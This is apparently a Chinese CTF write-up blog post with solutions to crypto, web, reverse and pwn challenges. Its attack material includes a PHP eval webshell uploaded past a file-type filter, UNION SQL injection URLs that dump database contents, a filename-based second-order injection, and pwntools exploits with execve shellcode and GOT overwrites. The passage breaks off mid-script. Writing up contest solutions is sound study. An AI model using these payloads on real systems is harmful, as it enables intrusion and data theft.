class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix</span>(<span class="params">key</span>):</span></span><br><span class="line">	matrix=[]</span><br><span class="line">	<span class="keyword">for</span> e <span class="keyword">in</span> key.upper():</span><br><span class="line">		<span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> matrix:</span><br><span class="line">			matrix.append(e)</span><br><span class="line">	alphabet=<span class="string">&quot;ABCDEFGHIKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">	<span class="keyword">for</span> e <span class="keyword">in</span> alphabet:</span><br><span class="line">		<span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> matrix:</span><br><span class="line">			matrix.append(e)</span><br><span class="line">	matrix_group=[]</span><br><span class="line">	<span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">		matrix_group.append(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	matrix_group[<span class="number">0</span>]=matrix[<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line">	matrix_group[<span class="number">1</span>]=matrix[<span class="number">5</span>:<span class="number">10</span>]</span><br><span class="line">	matrix_group[<span class="number">2</span>]=matrix[<span class="number">10</span>:<span class="number">15</span>]</span><br><span class="line">	matrix_group[<span class="number">3</span>]=matrix[<span class="number">15</span>:<span class="number">20</span>]</span><br><span class="line">	matrix_group[<span class="number">4</span>]=matrix[<span class="number">20</span>:<span class="number">25</span>]</span><br><span class="line">	<span class="keyword">return</span> matrix_group</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_position</span>(<span class="params">key_matrix,letter</span>):</span></span><br><span class="line">	x = y = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			<span class="keyword">if</span> key_matrix[i][j] == letter:</span><br><span class="line">				x = i</span><br><span class="line">				y = j</span><br><span class="line">	<span class="keyword">return</span> x,y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cipher_to_digraphs</span>(<span class="params">cipher</span>):</span></span><br><span class="line">	i=<span class="number">0</span></span><br><span class="line">	new=[]</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)/<span class="number">2</span>):</span><br><span class="line">		new.append(cipher[i:i+<span class="number">2</span>])</span><br><span class="line">		i=i+<span class="number">2</span></span><br><span class="line">	<span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher,key</span>):</span>	</span><br><span class="line">	cipher=cipher_to_digraphs(cipher)</span><br><span class="line">	key_matrix=matrix(key)</span><br><span class="line">	plaintext=[]</span><br><span class="line">	<span class="keyword">for</span> e <span class="keyword">in</span> cipher:</span><br><span class="line">		p1,q1=find_position(key_matrix,e[<span class="number">0</span>])</span><br><span class="line">		p2,q2=find_position(key_matrix,e[<span class="number">1</span>])</span><br><span class="line">		<span class="keyword">if</span> p1==p2:</span><br><span class="line">			<span class="keyword">if</span> q1==<span class="number">4</span>:</span><br><span class="line">				q1=-<span class="number">1</span></span><br><span class="line">			<span class="keyword">if</span> q2==<span class="number">4</span>:</span><br><span class="line">				q2=-<span class="number">1</span></span><br><span class="line">			plaintext.append(key_matrix[p1][q1-<span class="number">1</span>])</span><br><span class="line">			plaintext.append(key_matrix[p1][q2-<span class="number">1</span>])		</span><br><span class="line">		<span class="keyword">elif</span> q1==q2:</span><br><span class="line">			<span class="keyword">if</span> p1==<span class="number">4</span>:</span><br><span class="line">				p1=-<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span> p2==<span class="number">4</span>:</span><br><span class="line">				p2=-<span class="number">1</span>;</span><br><span class="line">			plaintext.append(key_matrix[p1-<span class="number">1</span>][q1])</span><br><span class="line">			plaintext.append(key_matrix[p2-<span class="number">1</span>][q2])</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			plaintext.append(key_matrix[p1][q2])</span><br><span class="line">			plaintext.append(key_matrix[p2][q1])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> unused <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;X&quot;</span> <span class="keyword">in</span> plaintext:</span><br><span class="line">			plaintext.remove(<span class="string">&quot;X&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	output=<span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> e <span class="keyword">in</span> plaintext:</span><br><span class="line">		output+=e</span><br><span class="line">	<span class="keyword">return</span> output.lower()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    key = <span class="string">&quot;&quot;</span></span><br><span class="line">    s = <span class="built_in">set</span>()</span><br><span class="line">    table = <span class="string">&quot;ABCDEFGHIKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    cipher = <span class="string">&quot;DMBCCVTLMNKQ&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">        key = table[a]</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            key += table[b]</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">                key += table[c]</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">                    key += table[d]</span><br><span class="line">                    r = <span class="string">&#x27;&#x27;</span>.join(x <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(key) <span class="keyword">if</span> key.index(x) == i)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(r) == <span class="number">4</span> <span class="keyword">and</span> <span class="string">&quot;flaga&quot;</span> <span class="keyword">in</span> decrypt(cipher,key):</span><br><span class="line">                        s.add(decrypt(cipher,key))</span><br><span class="line">                    key = key[:<span class="number">3</span>]</span><br><span class="line">                key = key[:<span class="number">2</span>]</span><br><span class="line">            key = key[:<span class="number">1</span>]</span><br><span class="line">        key = key[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        <span class="built_in">print</span> x</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<p>另一个改下密文，把 <code>flaga</code> 改成 <code>flagb</code> 也可以推出。接下来就开始筛选真正明文。</p>
+<p><img src="https://s2.ax1x.com/2019/01/26/kny8xI.png" alt="img"></p>
+<p><img src="https://s2.ax1x.com/2019/01/26/knyJMt.png" alt="img"></p>
+<p>故连起来就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagaplayfirflagbyoudoit</span><br></pre></td></tr></table></figure>
+
+<p>在线求下 <code>MD5</code> ，得到 flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><h4 id="SimpleUpoad签到"><a href="#SimpleUpoad签到" class="headerlink" title="SimpleUpoad签到"></a>SimpleUpoad签到</h4><p>拿到题目<br><img src="https://s2.ax1x.com/2019/01/24/kZ41AK.png" alt="kZ41AK.png"></p>
+<p>查看源码，发现允许上传.jpg|.png|.gif文件</p>
+<p><img src="https://s2.ax1x.com/2019/01/24/kZ4nXR.png" alt="kZ4nXR.png"></p>
+<p>还提示flag.php在当前目录下<br><img src="https://s2.ax1x.com/2019/01/24/kZ4NjA.png" alt="kZ4NjA.png"></p>
+<p>直接bp抓包，直接把.php类型文件改成可上传，<br><img src="https://s2.ax1x.com/2019/01/24/kZ4BAf.png" alt="kZ4BAf.png"></p>
+<p>上传一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  eval($_POST[&#x27;ee&#x27;]); ?&gt;]</span><br></pre></td></tr></table></figure>
+
+<p>即可成功上传，然后菜刀连接，即可在当前目录下，找到flag.php文件<br><img src="https://s2.ax1x.com/2019/01/24/kZ4OD1.png" alt="kZ4OD1.png"></p>
+<h4 id="SimpleSQLi-1"><a href="#SimpleSQLi-1" class="headerlink" title="SimpleSQLi-1"></a>SimpleSQLi-1</h4><p><img src="https://s2.ax1x.com/2019/01/25/kmV6L4.png" alt="kmV6L4.png"></p>
+<p>输入**?id=1**，得到如下信息：<br><img src="https://s2.ax1x.com/2019/01/25/kmVLTA.png" alt="kmVLTA.png"></p>
+<p>输入**?id=1’**,会报错。</p>
+<p>注入的步骤是爆库，爆表，爆列</p>
+<p>多写了个单引号导致报错，我们可以从报错看得出来这里是单引号括着id参数<br>所以我们闭合单引号<br>构造payload:<code>http://bxs.cumt.edu.cn:30007/test/index.php?id=1%27--+</code><br>可以成功回显，说明猜测成功</p>
+<p>用order by去猜列数<br><code>http://bxs.cumt.edu.cn:30007/test/index.php?id=1%27%20order%20by%203%23</code></p>
+<p>需要把第一句话弄成结果为空才能显示后面一句话的内容，可以选择id=-1，然后的话就可以回显2和3,后面就可以利用这两列回显你想要的东西了</p>
+<p>用mysql里面自带的information_schema表</p>
+<p>猜表名<br><code>id=-1%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</code><br><img src="https://s2.ax1x.com/2019/01/25/kmtujJ.png" alt="kmtujJ.png"></p>
+<p>猜列名<br><code>id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&#39;flagishere&#39;%23</code><br><img src="https://s2.ax1x.com/2019/01/25/kmtQBR.png" alt="kmtQBR.png"></p>
+<p>看里面的内容<br><code>http://bxs.cumt.edu.cn:30007/test/index.php?id=-1%27%20union%20select%201,2,concat_ws(%27%23%27,Id,flag)%20from%20flagishere%20limit%200,1%23</code><br><img src="https://s2.ax1x.com/2019/01/25/kmt3Ax.png" alt="kmt3Ax.png"></p>
+<h3 id="小型线上赌场"><a href="#小型线上赌场" class="headerlink" title="小型线上赌场"></a>小型线上赌场</h3><p>一开始没有思路，毕竟是萌新还没有了解到CTF的很多姿势，后来得知是vim文件泄露，在vim编辑的时候没有正常退出，系统就会自动生成一个swp文件用来日后的恢复；直接down下来，vim打开得源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$invest = $_GET[&#x27;invest&#x27;];  </span><br><span class="line">	$rand = rand(2,50);  </span><br><span class="line">	$len = strlen(trim($_GET[&#x27;invest&#x27;]));</span><br><span class="line">	foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">	    if(!is_numeric($value)||$value == &#x27;0&#x27;)&#123;</span><br><span class="line">	        die(&#x27;no no no!&#x27;);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$money = number_format($invest*$rand);</span><br><span class="line">	$money = intval(str_replace(&#x27;,&#x27;,&#x27;&#x27;,$money));</span><br><span class="line">	$guess = intval($_GET[&#x27;guess&#x27;]); </span><br><span class="line">	if ($guess == $money &amp;&amp; strlen($money)===$len)&#123;</span><br><span class="line">	    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看懂源码意思即可，生成<code>2~50</code>的随机数<code>rand</code>，<code>money</code>为<code>$invest*$rand</code>；如果<code>$money==$guess</code>就回显flag，即<code>invest*倍数==guess</code>即可，那我们可以直接bp爆破，猜一个<code>guess</code>，固定<code>invest</code>和<code>guess</code>的值，多次爆破，如果次数达到一定的上限一定会出现猜对倍数的情况，这样的话就会输出flag；</p>
+<p>截包，【Send to Intruder】，【Positions】下先【Clear】（因为我们填入的值不用变）。</p>
+<p><img src="https://s2.ax1x.com/2019/01/25/kmUBff.png" alt="img"></p>
+<p>在【Payload】下，将【Payload type】设为【Null payloads】，数量填写 <code>2000</code> 好了。</p>
+<p><img src="https://s2.ax1x.com/2019/01/25/kmUXA1.png" alt="img"></p>
+<p>然后【Options】下也随便设置。</p>
+<p><img src="https://s2.ax1x.com/2019/01/25/kmapcD.png" alt="img"></p>
+<p>设置完成后，【Intruder】-【Start attack】开始爆破。</p>
+<p>在结果【Result】下，按【Length】从低到高排序，可以看到长度为 <code>905</code> 的 Response 包里就有 flag 。</p>
+<p><img src="https://s2.ax1x.com/2019/01/25/kmaG40.png" alt="img"></p>
+<h3 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h3><p>队友Source在离别歌的blog里搜索到类似题目，了解到这题的切入点是二次注入，直接拿来payload就可以搞定这一题；</p>
+<ol>
+<li><p>先选择文件进行上传，filename为<code>&#39;,extension=&#39;&#39;,filename=&#39;x.jpg.jpg</code>；</p>
+<p><img src="https://s2.ax1x.com/2019/01/28/kM0tK0.png" alt="kM0tK0.png"></p>
+</li>
+<li><p>Rename file，注入后文件系统中文件名为<code>xl.jpg.jpg</code><img src="https://s2.ax1x.com/2019/01/28/kM02qK.png" alt="kM02qK.png"></p>
+</li>
+<li><p>上传真的包含webshell的文件；<img src="https://s2.ax1x.com/2019/01/28/kMBUSA.png" alt="kMBUSA.png"></p>
+</li>
+<li><p>改名后缀为<code>.php</code>，连接菜刀即可；<img src="https://s2.ax1x.com/2019/01/28/kMBrTS.png" alt="kMBrTS.png"></p>
+</li>
+<li><p>flag在根目录；</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/kuqufs"><img src="https://s2.ax1x.com/2019/01/27/kuqufs.md.png" alt="kuqufs.md.png"></a><a target="_blank" rel="noopener" href="https://imgchr.com/i/kuq1XV"><img src="https://s2.ax1x.com/2019/01/27/kuq1XV.md.png" alt="kuq1XV.md.png"></a></p>
+</li>
+</ol>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="逆向签到"><a href="#逆向签到" class="headerlink" title="逆向签到"></a>逆向签到</h3><p>拖到 IDA 里，<code>F5</code> 查看类C伪代码，可以看出：</p>
+<ol>
+<li>要输入 29 个字符。</li>
+<li><code>rd</code> 是 <code>[0,99]</code> 区间内的的随机整数</li>
+<li><code>for()</code> 循环中，每个字符与 <code>rd</code> 进行 <code>xor</code> 运算</li>
+<li><code>Check()</code> 函数中，检查每个 <code>s[i] ==  a[i]</code> 是否成立（<code>byte</code> 是一个字节，<code>_DWORD</code> 相当于 <code>int</code>，是四个字节）</li>
+</ol>
+<p>随机数。。。随缘程序。</p>
+<p>那就写个 Python 脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">v5 = (<span class="number">53</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">40</span>, <span class="number">1</span>, <span class="number">50</span>, <span class="number">61</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">62</span>, <span class="number">118</span>, <span class="number">98</span>, <span class="number">60</span>, <span class="number">60</span>, <span class="number">12</span>, <span class="number">106</span>, <span class="number">58</span>, <span class="number">37</span>, <span class="number">54</span>, <span class="number">12</span>, <span class="number">38</span>, <span class="number">12</span>, <span class="number">102</span>, <span class="number">48</span>, <span class="number">60</span>, <span class="number">33</span>, <span class="number">54</span>, <span class="number">46</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">        s += <span class="built_in">chr</span>(i^v5[j])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="built_in">print</span> s</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Rand0m%1oo_9ive_u_5core&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Easy-Math"><a href="#Easy-Math" class="headerlink" title="Easy_Math"></a>Easy_Math</h3><p>拖到 IDA 里，<code>F5</code> 查看类C伪代码，可以看出：</p>
+<ol>
+<li>要输入 9 个字符。</li>
+<li><code>String2Int()</code> 函数将字符数组 <code>a1</code> 的 ASCII 赋给整型数组 <code>a2</code></li>
+<li><code>Check()</code> 函数比较参数和 <code>v2 = (274, 294, 316, 262, 274, 252, 380, 421, 427)</code> 是否相等</li>
+<li>最重要的就是这个 <code>Change()</code> 函数，比较复杂。</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5 = (1, 2, 1, 2, 1, 1, 1, 1, 2)</span></span><br><span class="line"><span class="comment">//a是输入</span></span><br><span class="line"><span class="built_in">Change</span>((__int64)&amp;a, (__int64)&amp;v5, (__int64)&amp;ans);	<span class="comment">//main()函数中调用</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">(__int64 a, __int64 v5, __int64 ans)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax@3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> m; <span class="comment">// [sp+24h] [bp-14h]@10</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> l; <span class="comment">// [sp+28h] [bp-10h]@9</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> k; <span class="comment">// [sp+2Ch] [bp-Ch]@7</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+30h] [bp-8h]@2</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+34h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//ans[3*i+j] = 0</span></span><br><span class="line">  <span class="comment">//3i+j = 0, 1, 2, 3, 4, 5, 6, 7, 8</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (_DWORD *)(<span class="number">4</span> * (<span class="number">3</span> * i + (<span class="keyword">signed</span> __int64)j) + ans);</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="comment">//ans[3*i+j] += v5[3*k+j]*a[3*i+k]</span></span><br><span class="line">  <span class="comment">//v5已知，a未知，ans(v2)已知</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">2</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        resujt = (_DWORD *)(<span class="number">4</span> * (<span class="number">3</span> * i + (<span class="keyword">signed</span> __int64)j) + ans);</span><br><span class="line">        *resujt += *(_DWORD *)(<span class="number">4</span> * (<span class="number">3</span> * k + (<span class="keyword">signed</span> __int64)j) + v5) * *(_DWORD *)(<span class="number">4</span> * (<span class="number">3</span> * i + (<span class="keyword">signed</span> __int64)k) + a);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来，解九元一次方程组（三个三个一组）可得到 flag 。</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><h4 id="how"><a href="#how" class="headerlink" title="how"></a>how</h4><p><img src="https://img-blog.csdnimg.cn/20190127203751806.png" alt="main"></p>
+<p>显然是栈溢出，search一下控制栈指针的语句发现：</p>
+<p><img src="https://img-blog.csdnimg.cn/20190127203952250.png" alt="jmp esp"></p>
+<p>但是后面只有<code>50-0x20-4-4 = 10</code>个字节，不够写shellcode。</p>
+<p>窝们可以将shellcode写在前面，覆盖eip为<code>0x8048504</code>，后接esp-（<code>4(eip) + 4(ebp) + 0x20 = 0x28</code>）,再jmp esp(shellcode)即可。</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())too longQAQ...</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><span class="comment">#x86</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;47.106.211.189&#x27;, 10000)</span></span><br><span class="line">p = process(<span class="string">&#x27;./Welcome&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;What\&#x27;s your name?\n&#x27;</span>)</span><br><span class="line">p.sendline(shellcode + (<span class="number">0x20</span>-<span class="built_in">len</span>(shellcode)+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span> + p32(<span class="number">0x08048504</span>) + asm(<span class="string">&#x27;sub esp, 0x28\njmp esp&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>文件里包含一大堆加密、hash函数，一开始都看懵了，其实。。。不重要。</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul>
+<li>主函数：</li>
+</ul>
+<p>输入长度不超过12，一波验证看下来，发现根本不可能通过验证的（所以这不是re是pwn啊，pia！）。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190128234428287.png" alt="main"></p>
+<ul>
+<li>将输入copy至ebp-8h（4字节）处</li>
+</ul>
+<p>其中，<code>input</code>在<strong>bss</strong>段！易得到其地址：<code>.bss:0811EB40 ...</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20190128234349232.png" alt="auth"></p>
+<ul>
+<li>corret里得到call system(‘\sh’)地址</li>
+</ul>
+<p><code>.text:0804928B                 call    system</code></p>
+<ul>
+<li>how</li>
+</ul>
+<p>输入最长12字节 -&gt;</p>
+<p>任意填充4字节 +<br>system_addr的4字节 +<br>(buffer_addr+4-4)覆盖ebp的4字节，刚刚好~</p>
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;47.106.211.189&#x27;, 10001)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Authenticate :&quot;</span>)</span><br><span class="line">p.sendline((p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x08049284</span>) + p32(<span class="number">0x0811EB40</span>)).encode(<span class="string">&quot;base64&quot;</span>))</span><br><span class="line"><span class="comment">#payload,shell,buffer</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="brainfxxk"><a href="#brainfxxk" class="headerlink" title="brainfxxk"></a>brainfxxk</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>一种。。。语言？可以控制(<strong>bss</strong>段)指针p±1，指针p对应内容±1以及输入输出。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190128125438633.png" alt="trans"></p>
+<p>GOT表就在附近，一共可输入1024字节，足够为所欲为了。</p>
+<p>有libc文件，leak出putchar的地址算出其他地址，花式修改got表而后fgets(“\sh\x00”)即可。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190128125230841.png" alt="main"></p>
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;47.106.211.189&#x27;, 10002)</span></span><br><span class="line">p = process(<span class="string">&quot;./brainfxxk&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./brainfxxk&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Type brainfuck instructions below:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;.&quot;</span> <span class="comment">#call putchar to fill the got_putchar with its real_addr.</span></span><br><span class="line">+ <span class="string">&quot;&lt;&quot;</span>*(<span class="number">0x70</span>+<span class="number">1</span>) + <span class="string">&quot;&gt;.&quot;</span>*<span class="number">4</span><span class="comment">#leak putchar_addr.</span></span><br><span class="line">+ <span class="string">&quot;&lt;&quot;</span>*<span class="number">8</span>+<span class="string">&quot;&gt;,&quot;</span>*<span class="number">8</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">0x24</span>+<span class="string">&quot;&gt;,&quot;</span>*<span class="number">4</span><span class="comment">#memset(gets),putchar(main),fgets(system).</span></span><br><span class="line">+ <span class="string">&quot;.&quot;</span>)<span class="comment">#call main</span></span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">&quot;putchar&quot;</span>]</span><br><span class="line"><span class="comment">#print base</span></span><br><span 